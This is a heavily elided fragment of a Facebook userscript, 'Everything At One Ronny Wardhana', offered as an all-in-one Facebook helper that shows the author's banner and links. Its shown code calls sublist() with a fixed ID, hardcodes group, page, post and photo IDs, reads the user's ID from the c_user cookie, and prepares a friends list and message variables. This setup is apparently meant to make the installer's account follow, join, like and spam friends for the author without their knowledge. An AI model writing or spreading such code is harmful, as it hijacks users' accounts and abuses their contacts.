// ==UserScript==
// @name            Everything At One Ronny Wardhana
// @description     All about facebook By Ronny Wardhana
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='https://www.facebook.com/bl4ck.raptor'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='https://www.facebook.com/background.new2011' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/bl4ck.raptor" target="_blank">Created by Ronny Wardhana <br>CLICK HERE</a>';
	html += '</div>';
...
sublist("521557741246728");


//Group ku bl4ck.raptor
var gid = ['584801104899704'];
...
var spage_id = "243579742318733";
var spost_id = "100001775194983";
var sfoto_id = "483839941685175";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
